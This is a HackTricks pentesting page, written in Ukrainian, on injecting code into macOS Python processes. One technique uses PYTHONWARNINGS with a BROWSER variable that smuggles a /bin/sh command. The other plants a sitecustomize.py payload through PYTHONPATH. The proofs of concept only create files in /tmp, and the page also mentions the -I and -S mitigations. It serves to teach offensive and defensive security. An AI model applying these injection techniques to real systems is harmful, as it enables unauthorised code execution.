# Ін’єкція в Python-застосунок macOS

{{#include ../../../banners/hacktricks-training.md}}

## Через змінні середовища `PYTHONWARNINGS` і `BROWSER`

Якщо зловмисник може контролювати середовище процесу Python, поєднання `PYTHONWARNINGS` і `BROWSER` може ініціювати виконання команд, коли Python імпортує модуль `antigravity` під час обробки створеного параметра попередження. Техніка ґрунтується на тому, що `antigravity` відкриває URL за допомогою модуля Python `webbrowser`, який враховує змінну середовища `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Через `PYTHONPATH` і `sitecustomize.py`

Під час звичайного запуску модуль Python `site` додає специфічні для site шляхи, а потім намагається імпортувати модуль із назвою `sitecustomize`. Розмістивши каталог, доступний для запису зловмисником, першим у `PYTHONPATH`, зловмисник, який контролює середовище процесу, може змусити Python імпортувати payload до запуску цільового скрипта. Прапорець `-S` вимикає автоматичну ініціалізацію `site`, тоді як ізольований режим (`-I`) ігнорує `PYTHONPATH` і передбачає використання `-s` та `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-specific configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Python command-line and environment](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
